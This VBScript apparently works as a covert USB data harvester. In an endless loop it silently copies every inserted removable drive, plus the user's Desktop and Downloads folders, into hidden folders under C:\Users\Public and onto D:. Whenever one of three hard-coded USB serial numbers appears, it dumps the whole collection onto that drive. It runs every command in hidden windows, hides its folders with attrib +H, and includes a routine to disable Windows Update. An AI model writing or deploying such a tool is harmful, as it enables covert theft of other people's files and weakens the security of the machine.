
Call Main()

Sub Main()

	'On Error Resume Next

	Dim debug, updateDisable
	debug = 0
	updateDisable = 0

	If ( updateDisable = 1 ) Then
		Call DisableUpdate ( debug )	
	End If
	
	Dim objFSO, objWMIService, ws
	Dim colDrives
	Dim strComputer

	Do While True
	
		strComputer = "."
		Set objWMIService = GetObject ( "winmgmts:\\" & strComputer & "\root\cimv2" )
		Set colDrives = objWMIService.ExecQuery ( "Select * From Win32_LogicalDisk Where ( ( DriveType = 2 ) AND NOT ( VolumeSerialNumber = NULL ) )" )
		Set ws = CreateObject ( "Wscript.Shell" )
		Set objFSO = CreateObject ( "Scripting.FileSystemObject" )
		
			Call CopyUSBDriver ( debug, colDrives, objFSO, ws )
			Call CopyDesktopFolder ( debug, colDrives, objFSO, ws )
			Call CopyDownloadsFolder ( debug, colDrives, objFSO, ws )
			Call CopyToDDisk ( debug, colDrives, objFSO, ws )
			
		Set colDrives = Nothing
		Set objWMIService = Nothing
		Set ws = Nothing
		Set objFSO = Nothing
		
		If debug = 1 Then
			' Take a break to prevent CPU usage 100% .
			wscript.sleep ( 2 * 1000 )
		Else
			' Take a break for user can release USB drive.
			wscript.sleep ( 2 * 60 * 1000 )
		End If
		
	Loop

	'On Error GoTo 0
	
End Sub

'--------------------------------------------------

Sub DisableUpdate ( ByVal debug )

	If ( debug = 1 ) Then

		Wscript.Echo _
			"Windows Update will be disable!" & vbNewLine

	End If

'--------------------
	
	strComputer = "."  'could be any computer, not just the local one '
	Set objWMIService = GetObject ( "winmgmts:\\" & strComputer & "\root\cimv2" )
	Set colServiceList = objWMIService.ExecQuery ( "Select * from Win32_Service where Name = 'wuauserv'" )

	For Each objService in colServiceList

		objService.ChangeStartMode ( "Disabled" )

	Next

	Set objWMIService = Nothing
	Set colServiceList = Nothing

'--------------------
	
	If ( debug = 1 ) Then

		Wscript.Echo _
			"Windows Update is disable now!" & vbNewLine

	End If
		
End Sub

'--------------------------------------------------

function IsProcessRunning ( BYVAL debug, BYVAL strProcessName )

	Dim processRunning
	Dim sComputerName, sQuery
	Dim objWMIService, objItems
	Dim objItem
	
	processRunning = False

	sComputerName = "."
	Set objWMIService = GetObject ( "winmgmts:\\" & sComputerName & "\root\cimv2" )
	'sQuery = "SELECT * FROM Win32_Process where name like '%" & strProcessName & "%'"
	'sQuery = "SELECT * FROM Win32_Process where ( name = 'xcopy.exe')"
	sQuery = "SELECT * FROM Win32_Process where ( name = '" & strProcessName & "')"
	Set objItems = objWMIService.ExecQuery ( sQuery )

	For Each objItem In objItems
	
		If ( debug = 1 ) Then
		
			Wscript.Echo _
				"strProcessName: " & strProcessName & vbNewLine & _
				"CreationClassName: " & objItem.CreationClassName & vbNewLine & _
				"Caption: " & objItem.Caption & vbNewLine & _
				"CommandLine: " & objItem.CommandLine & vbNewLine & _
				"CreationDate: " & objItem.CreationDate & vbNewLine & _
				"CSCreationClassName: " & objItem.CSCreationClassName & vbNewLine & _
				"CSName: " & objItem.CSName & vbNewLine & _
				"Description: " & objItem.Description & vbNewLine & _
				"ExecutablePath: " & objItem.ExecutablePath & vbNewLine & _
				"ExecutionState: " & objItem.ExecutionState & vbNewLine & _
				"Handle: " & objItem.Handle & vbNewLine & _
				"HandleCount: " & objItem.HandleCount & vbNewLine & _
				"InstallDate: " & objItem.InstallDate & vbNewLine & _
				"KernelModeTime: " & objItem.KernelModeTime & vbNewLine & _
				"MaximumWorkingSetSize: " & objItem.MaximumWorkingSetSize & vbNewLine & _
				"MinimumWorkingSetSize: " & objItem.MinimumWorkingSetSize & vbNewLine & _
				"Name: " & objItem.Name & vbNewLine & _
				"OSCreationClassName: " & objItem.OSCreationClassName & vbNewLine & _
				"OSName: " & objItem.OSName & vbNewLine & _
				"OtherOperationCount: " & objItem.OtherOperationCount & vbNewLine & _
				"OtherTransferCount: " & objItem.OtherTransferCount & vbNewLine & _
				"PageFaults: " & objItem.PageFaults & vbNewLine & _
				"PageFileUsage: " & objItem.PageFileUsage & vbNewLine & _
				"ParentProcessId: " & objItem.ParentProcessId & vbNewLine & _
				"PeakPageFileUsage: " & objItem.PeakPageFileUsage & vbNewLine & _
				"PeakVirtualSize: " & objItem.PeakVirtualSize & vbNewLine & _
				"PeakWorkingSetSize: " & objItem.PeakWorkingSetSize & vbNewLine & _
				"PrivatePageCount: " & objItem.PrivatePageCount & vbNewLine & _
				"ProcessId: " & objItem.ProcessId & vbNewLine & _
				"QuotaNonPagedPoolUsage: " & objItem.QuotaNonPagedPoolUsage & vbNewLine & _
				"QuotaPagedPoolUsage: " & objItem.QuotaPagedPoolUsage & vbNewLine & _
				"QuotaPeakNonPagedPoolUsage: " & objItem.QuotaPeakNonPagedPoolUsage & vbNewLine & _
				"QuotaPeakPagedPoolUsage: " & objItem.QuotaPeakPagedPoolUsage & vbNewLine & _
				"ReadOperationCount: " & objItem.ReadOperationCount & vbNewLine & _
				"ReadTransferCount: " & objItem.ReadTransferCount & vbNewLine & _
				"SessionId: " & objItem.SessionId & vbNewLine & _
				"Status: " & objItem.Status & vbNewLine & _
				"TerminationDate: " & objItem.TerminationDate & vbNewLine & _
				"ThreadCount: " & objItem.ThreadCount & vbNewLine & _
				"UserModeTime: " & objItem.UserModeTime & vbNewLine & _
				"VirtualSize: " & objItem.VirtualSize & vbNewLine & _
				"WindowsVersion: " & objItem.WindowsVersion & vbNewLine & _
				"WorkingSetSize: " & objItem.WorkingSetSize & vbNewLine & _
				"WriteOperationCount: " & objItem.WriteOperationCount & vbNewLine & _
				"WriteTransferCount: " & objItem.WriteTransferCount & vbNewLine

			Wscript.Echo _
				strProcessName & " is running! Now is in break mode!" & vbNewLine

		End If
		
		If UCase ( objItem.name ) = UCase ( strProcessName ) Then

			processRunning = True

		End If
		
	Next

	Set objWMIService = Nothing
	Set objItems = Nothing
	
	IsProcessRunning = processRunning

end function

'--------------------------------------------------

function CUSB ( ByVal debug, ByVal volumeSerialNumber )
  
	Dim i, isCUSB
	Dim dstCUSBSerials, dstCUSBLabels

	'Warning: VolumeSerialNumber can be reset after format this storage bu user.

	dstCUSBSerials = Array ( "CAFA873C", "1A75FD65", "A4409DA1" )
	dstCUSBLabels = Array ( "Kingston 8GB", "SONY 16GB", "SanDisk 64GB" )
	' CAFA873C = Kingston 8GB
	' 1A75FD65 = SONY 16GB
	' A4409DA1 = SanDisk 64GB
	
	isCUSB = 0
	
	For i = 0 To UBound ( dstCUSBSerials )

		If ( volumeSerialNumber = dstCUSBSerials ( i ) ) Then
			
			If ( debug = 1 ) Then Wscript.Echo "CUSB serial number be detected: " & dstCUSBSerials ( i ) & ": " & dstCUSBLabels ( i )  End If
			
			isCUSB = 1

		End If

	Next
	
	CUSB = isCUSB
		
end function

'--------------------------------------------------

Sub CopyDesktopFolder ( ByVal debug, ByRef colDrives, ByRef objFSO, ByRef ws )

	Dim dstFolder, dstFolderPath
	Dim srcCopyFolder, srcFolderPath

	srcCopyFolder = "%USERPROFILE%\Desktop\*"
	srcFolderPath = "%USERPROFILE%\Desktop\"
	
	dstFolder = "C:\Users\Public\Downloads\XCOPY\" & Year ( Now ) & Right ( "0" & Month(Now), 2) & Right ( "0" & Day ( Now ), 2 ) & "_Desktop"
	dstFolderPath = "C:\Users\Public\Downloads\XCOPY\" & Year ( Now ) & Right ( "0" & Month(Now), 2) & Right ( "0" & Day ( Now ), 2 ) & "_Desktop\"

	If ( debug = 1 ) Then

		Wscript.Echo _
			"Desktop folder: " & srcCopyFolder & vbNewLine & _
			"Will be copy to: " & dstFolderPath & vbNewLine
	End If

	ws.Run "cmd /c mkdir " & dstFolderPath, 0, False

	wscript.sleep ( 2 * 1000 )

	ws.Run "attrib +H " & dstFolder, 0, False
	
	ws.Run "xcopy.exe " & srcCopyFolder & " " & dstFolderPath & " /C /D /E /H /I /K /Q /Y /J", 0, False

	wscript.sleep ( 2 * 1000 )

	Do While ( ( IsProcessRunning ( debug, "xcopy.exe" ) ) = True )

		wscript.sleep ( 2 * 1000 )

	Loop

End Sub

'--------------------------------------------------

Sub CopyDownloadsFolder ( ByVal debug, ByRef colDrives, ByRef objFSO, ByRef ws )

	Dim dstFolder, dstFolderPath
	Dim srcCopyFolder, srcFolderPath

	srcCopyFolder = "%USERPROFILE%\Downloads\*"
	srcFolderPath = "%USERPROFILE%\Downloads\"
	
	dstFolder = "C:\Users\Public\Downloads\XCOPY\" & Year ( Now ) & Right ( "0" & Month(Now), 2) & Right ( "0" & Day ( Now ), 2 ) & "_Downloads"
	dstFolderPath = "C:\Users\Public\Downloads\XCOPY\" & Year ( Now ) & Right ( "0" & Month(Now), 2) & Right ( "0" & Day ( Now ), 2 ) & "_Downloads\"

	If ( debug = 1 ) Then

		Wscript.Echo _
			"Downloads folder: " & srcCopyFolder & vbNewLine & _
			"Will be copy to: " & dstFolderPath & vbNewLine
	End If

	ws.Run "cmd /c mkdir " & dstFolderPath, 0, False

	wscript.sleep ( 2 * 1000 )

	ws.Run "attrib +H " & dstFolder, 0, False
	
	ws.Run "xcopy.exe " & srcCopyFolder & " " & dstFolderPath & " /C /D /E /H /I /K /Q /Y /J", 0, False

	wscript.sleep ( 2 * 1000 )

	Do While ( ( IsProcessRunning ( debug, "xcopy.exe" ) ) = True )

		wscript.sleep ( 2 * 1000 )

	Loop

End Sub

'--------------------------------------------------

Sub CopyToDDisk ( ByVal debug, ByRef colDrives, ByRef objFSO, ByRef ws )

	Dim dstFolder, dstFolderPath
	Dim srcCopyFolder, srcFolderPath

	srcCopyFolder = "C:\Users\Public\Downloads\XCOPY\*" 
	srcFolderPath = "C:\Users\Public\Downloads\XCOPY\"
	
	dstFolder = "D:\Users\Public\Downloads\XCOPY"
	dstFolderPath = "D:\Users\Public\Downloads\XCOPY\"

	If ( debug = 1 ) Then

		Wscript.Echo _
			"XCOPY folder: " & srcCopyFolder & vbNewLine & _
			"Will be copy to: " & dstFolderPath & vbNewLine
	End If

	ws.Run "cmd /c mkdir " & dstFolderPath, 0, False

	wscript.sleep ( 2 * 1000 )

	ws.Run "attrib +H " & dstFolder, 0, False
	
	ws.Run "xcopy.exe " & srcCopyFolder & " " & dstFolderPath & " /C /D /E /H /I /K /Q /Y /J", 0, False

	wscript.sleep ( 2 * 1000 )

	Do While ( ( IsProcessRunning ( debug, "xcopy.exe" ) ) = True )

		wscript.sleep ( 2 * 1000 )

	Loop

End Sub

'--------------------------------------------------

Sub CopyUSBDriver ( ByVal debug, ByRef colDrives, ByRef objFSO, ByRef ws )

		'Dim debug
		'debug = 0

		Dim objDrive
		Dim strDriveLetter
		
		' SourceFolder
		Dim objSrcDrive, objSrcFolder
		Dim srcDriver, srcFolderPath, srcCopyFolder

		' Destination
		Dim objDstFolder
		Dim dstFolder, dstFolderPath

		' C. USB
		Dim srcCFolderPath, srcCCopyFolder
		Dim dstCUSB
		
'--------------------------------------------------

'--------------------------------------------------
		
		For Each objDrive In colDrives
		
			strDriveLetter = objDrive.DeviceID

			' SourceFolder
			srcDriver = strDriveLetter 'e.g.: "M:"
			srcFolderPath = strDriveLetter & "\" 'e.g.: "M:\"
			srcCopyFolder = strDriveLetter & "\*" 'e.g.: "M:\*"

			' Destination
			' "ws.Run attrib" cannot use "...\", need to use "..."
			dstFolder = "C:\Users\Public\Downloads\XCOPY\" & Year ( Now ) & Right ( "0" & Month(Now), 2) & Right ( "0" & Day ( Now ), 2 ) & "_" & objDrive.VolumeSerialNumber
			dstFolderPath = "C:\Users\Public\Downloads\XCOPY\" & Year ( Now ) & Right ( "0" & Month(Now), 2) & Right ( "0" & Day ( Now ), 2 ) & "_" & objDrive.VolumeSerialNumber & "\"

			' C. USB
			srcCFolderPath = "C:\Users\Public\Downloads\XCOPY\" 
			srcCCopyFolder = "C:\Users\Public\Downloads\XCOPY\*"
			dstCUSB = """" & strDriveLetter & "\VBScript\XCOPY\" & """"

			If ( debug = 1 ) Then
			
				Wscript.Echo _
					"srcDriver: " & srcDriver & vbNewLine & _
					"srcFolderPath: " & srcFolderPath & vbNewLine & _
					"srcCopyFolder: " & srcCopyFolder & vbNewLine & _
					"dstFolderPath: " & dstFolderPath & vbNewLine & _
					"srcCFolderPath: " & srcCFolderPath & vbNewLine & _
					"srcCCopyFolder: " & srcCCopyFolder & vbNewLine & _
					"dstCUSB: " & dstCUSB & vbNewLine & _
					"colDrives.count: " & colDrives.count & vbNewLine & _
					"objDrive.Access: " & objDrive.Access & vbNewLine & _
					"objDrive.Availability: " & objDrive.Availability & vbNewLine & _
					"objDrive.BlockSize: " & objDrive.BlockSize & vbNewLine & _
					"objDrive.Caption: " & objDrive.Caption & vbNewLine & _
					"objDrive.Compressed: " & objDrive.Compressed & vbNewLine & _
					"objDrive.ConfigManagerErrorCode: " & objDrive.ConfigManagerErrorCode & vbNewLine & _
					"objDrive.ConfigManagerUserConfig: " & objDrive.ConfigManagerUserConfig & vbNewLine & _
					"objDrive.CreationClassName: " & objDrive.CreationClassName & vbNewLine & _
					"objDrive.Description: " & objDrive.Description & vbNewLine & _
					"objDrive.DeviceID: " & objDrive.DeviceID & vbNewLine & _
					"objDrive.DriveType: " & objDrive.DriveType & vbNewLine & _
					"objDrive.ErrorCleared: " & objDrive.ErrorCleared & vbNewLine & _
					"objDrive.ErrorDescription: " & objDrive.ErrorDescription & vbNewLine & _
					"objDrive.ErrorMethodology: " & objDrive.ErrorMethodology & vbNewLine & _
					"objDrive.FileSystem: " & objDrive.FileSystem & vbNewLine & _
					"objDrive.FreeSpace: " & objDrive.FreeSpace & vbNewLine & _
					"objDrive.InstallDate: " & objDrive.InstallDate & vbNewLine & _
					"objDrive.LastErrorCode: " & objDrive.LastErrorCode & vbNewLine & _
					"objDrive.MaximumComponentLength: " & objDrive.MaximumComponentLength & vbNewLine & _
					"objDrive.MediaType: " & objDrive.MediaType & vbNewLine & _
					"objDrive.Name: " & objDrive.Name & vbNewLine & _
					"objDrive.NumberOfBlocks: " & objDrive.NumberOfBlocks & vbNewLine & _
					"objDrive.PNPDeviceID: " & objDrive.PNPDeviceID & vbNewLine & _
					"objDrive.PowerManagementSupported: " & objDrive.PowerManagementSupported & vbNewLine & _
					"objDrive.ProviderName: " & objDrive.ProviderName & vbNewLine & _
					"objDrive.Purpose: " & objDrive.Purpose & vbNewLine & _
					"objDrive.QuotasDisabled: " & objDrive.QuotasDisabled & vbNewLine & _
					"objDrive.QuotasIncomplete: " & objDrive.QuotasIncomplete & vbNewLine & _
					"objDrive.QuotasRebuilding: " & objDrive.QuotasRebuilding & vbNewLine & _
					"objDrive.Size: " & objDrive.Size & vbNewLine & _
					"objDrive.Status: " & objDrive.Status & vbNewLine & _
					"objDrive.StatusInfo: " & objDrive.StatusInfo & vbNewLine & _
					"objDrive.SupportsDiskQuotas: " & objDrive.SupportsDiskQuotas & vbNewLine & _
					"objDrive.SupportsFileBasedCompression: " & objDrive.SupportsFileBasedCompression & vbNewLine & _
					"objDrive.SystemCreationClassName: " & objDrive.SystemCreationClassName & vbNewLine & _
					"objDrive.SystemName: " & objDrive.SystemName & vbNewLine & _
					"objDrive.VolumeDirty: " & objDrive.VolumeDirty & vbNewLine & _
					"objDrive.VolumeName: " & objDrive.VolumeName & vbNewLine & _
					"objDrive.VolumeSerialNumber: " & objDrive.VolumeSerialNumber & vbNewLine

			End If

'--------------------------------------------------

			isCUSB = CUSB ( debug, objDrive.VolumeSerialNumber )

'--------------------------------------------------

			'Only CUSB drive can get data automatically.
			If ( colDrives.count = 1 ) AND ( isCUSB = 1 ) Then
			
				If ( debug = 1 ) Then Wscript.Echo "Disk " & srcDriver & " in ""PC to CUSB get back mode""." & vbNewLine & _
					"srcCFolderPath: " & srcCFolderPath & vbNewLine & _
					"objFSO.folderexists ( srcCFolderPath ) = " & objFSO.folderexists ( srcCFolderPath ) End If
			
				
				If ( objFSO.folderexists ( srcCFolderPath ) ) = True then

					'0: Hides the window and activates another window. 
					'True: script execution halts until the program finishes, and Run returns any error code returned by the program.
					'False: (the default), the Run method returns immediately after starting the program, automatically returning 0 (not to be interpreted as an error code).
					ws.Run "xcopy.exe " & srcCCopyFolder & " " & dstCUSB & " /C /D /E /H /I /K /Q /Y /J", 0, False

					wscript.sleep ( 2 * 1000 )

					Do While ( ( IsProcessRunning ( debug, "xcopy.exe" ) ) = True )

						wscript.sleep ( 2 * 1000 )

					Loop
					
				End If

			'USB drive CUSB insert and another USB drive insert, too. Do nothing.
			ElseIf ( colDrives.count > 1 ) AND ( isCUSB = 1 ) Then

				'If ( debug = 1 ) Then Wscript.Echo "Disk " & srcDriver & " in ""do nothing mode""." End If
				If ( debug = 1 ) Then Wscript.Echo "Disk " & srcDriver & " in ""PC to CUSB get back mode ( Muti-USB mode )""." End If
				
				If ( objFSO.folderexists ( srcCFolderPath ) ) = True then

					'0: Hides the window and activates another window. 
					'True: script execution halts until the program finishes, and Run returns any error code returned by the program.
					'False: (the default), the Run method returns immediately after starting the program, automatically returning 0 (not to be interpreted as an error code).
					ws.Run "xcopy.exe " & srcCCopyFolder & " " & dstCUSB & " /C /D /E /H /I /K /Q /Y /J", 0, False

					wscript.sleep ( 2 * 1000 )

					Do While ( ( IsProcessRunning ( debug, "xcopy.exe" ) ) = True )

						wscript.sleep ( 2 * 1000 )

					Loop
					
				End If
				
			ElseIf ( objFSO.DriveExists ( srcDriver ) ) = True Then
			
				If ( debug = 1 ) Then Wscript.Echo "Disk " & srcDriver & " in ""USB to PC copy mode""." End If
				
				' objFSO.folderexists cannot use %USERPROFILE%
				If ( objFSO.folderexists ( dstFolderPath ) ) = False then

					ws.Run "cmd /c mkdir " & dstFolderPath, 0, False

					wscript.sleep ( 2 * 1000 )

					ws.Run "attrib +H " & dstFolder, 0, False
					
					ws.Run "xcopy.exe " & srcCopyFolder & " " & dstFolderPath & " /C /D /E /H /I /K /Q /Y /J", 0, False

					wscript.sleep ( 2 * 1000 )

					Do While ( ( IsProcessRunning ( debug, "xcopy.exe" ) ) = True )

						wscript.sleep ( 2 * 1000 )

					Loop

				End If

			End If

'--------------------------------------------------

		Next
		
'--------------------------------------------------

End Sub

'--------------------------------------------------
